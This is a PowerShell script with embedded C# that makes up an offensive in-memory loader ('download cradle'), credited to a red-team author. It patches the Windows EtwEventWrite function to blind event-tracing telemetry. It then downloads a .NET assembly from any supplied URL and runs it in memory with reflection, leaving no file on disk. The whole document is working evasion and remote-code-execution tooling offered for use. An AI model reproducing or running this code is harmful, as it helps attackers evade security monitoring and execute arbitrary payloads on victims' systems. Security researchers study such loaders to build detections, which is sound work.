
function Invoke-Sharpcradle
{
<#
    .DESCRIPTION
        Download .NET Binary to RAM.
        Credits to https://github.com/anthemtotheego for Sharpcradle in C#
        Author: @securethisshit
        License: BSD 3-Clause
    #>

Param
    (
        [string]
        $uri,
	    [string]
        $argument1,
	[string]
        $argument2,
	[string]
        $argument3
)


$cradle = @"
using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;


namespace SharpCradle
{
    public class Win32
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    }

    public class Program
    {
        public static void EtwPatch(byte[] patch)
        {
            try
            {
                uint oldProtect;

                var ntdll = Win32.LoadLibrary("ntdll.dll");
                var etwEventSend =   Win32.GetProcAddress(ntdll, "EtwEventWrite");

                Win32.VirtualProtect(etwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect);
                Marshal.Copy(patch, 0, etwEventSend, patch.Length);
            }
            catch
            {
                Console.WriteLine("Error unhooking ETW");
            }
        }
        public static void Main(params string[] args)
        {
            Console.WriteLine("Doing ETW unhook.");
            if (IntPtr.Size == 8)
            {
                Console.WriteLine("x64 patch.");
                EtwPatch(new byte[] {0x48, 0xb8, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xE0 });
            }
            else
            {
                Console.WriteLine("x86 patch.");
                EtwPatch(new byte[] { 0xc2, 0x14, 0x00 });
            }
            Console.WriteLine("ETW Unhook done!");

            Console.ReadLine();
     
          try
          {
          
            string url = args[0];
            
                
                object[] cmd = args.Skip(1).ToArray();
                MemoryStream ms = new MemoryStream();
                using (WebClient client = new WebClient())
                {
                    //Access web and read the bytes from the binary file
                    System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls | System.Net.SecurityProtocolType.Tls11 | System.Net.SecurityProtocolType.Tls12;
                    ms = new MemoryStream(client.DownloadData(url));
                    BinaryReader br = new BinaryReader(ms);
                    byte[] bin = br.ReadBytes(Convert.ToInt32(ms.Length));
                    ms.Close();
                    br.Close();
                   loadAssembly(bin, cmd);
                }
            

          }//End try
          catch
          {
            Console.WriteLine("Something went wrong! Check parameters and make sure binary uses managed code");
          }//End catch
        }//End Main  
        
        //loadAssembly
        public static void loadAssembly(byte[] bin, object[] commands)
        {
            Assembly a = Assembly.Load(bin);
            try
            {       
                a.EntryPoint.Invoke(null, new object[] { commands });
            }
            catch
            {
                MethodInfo method = a.EntryPoint;
                if (method != null)
                {
                    object o = a.CreateInstance(method.Name);                    
                    method.Invoke(o, null);
                }
            }//End try/catch            
        }//End loadAssembly
        }


}
"@

Add-Type -TypeDefinition $cradle -Language CSharp
if ($argument1 -and $argument2 -and $argument3)
{
	[SharpCradle.Program]::Main("$uri", "$argument1", "$argument2", "$argument3")
}
elseif ($argument1 -and $argument2)
{
	[SharpCradle.Program]::Main("$uri", "$argument1", "$argument2")
}
elseif ($argument1)
{
	[SharpCradle.Program]::Main("$uri", "$argument1")
}
else
{
	[SharpCradle.Program]::Main("$uri")
}

}
